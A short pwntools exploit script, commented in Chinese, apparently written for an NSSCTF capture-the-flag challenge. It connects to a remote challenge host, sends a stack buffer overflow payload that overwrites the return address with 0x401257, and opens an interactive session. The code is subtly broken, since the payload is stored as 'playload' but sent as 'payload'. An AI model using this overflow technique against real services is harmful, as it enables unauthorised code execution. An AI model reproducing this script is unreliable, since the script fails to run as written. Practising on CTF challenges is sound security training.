from pwn import *#引用pwntools库
p = remote("node4.anna.nssctf.cn",25012) #配置nc链接
playload = b'a'*(0x20+8)+p64(0x401257) #p64 就是 8字节打包，p32 是 4字节打包
p.sendline(payload) #发送攻击字符串
p.interactive()#与程序交互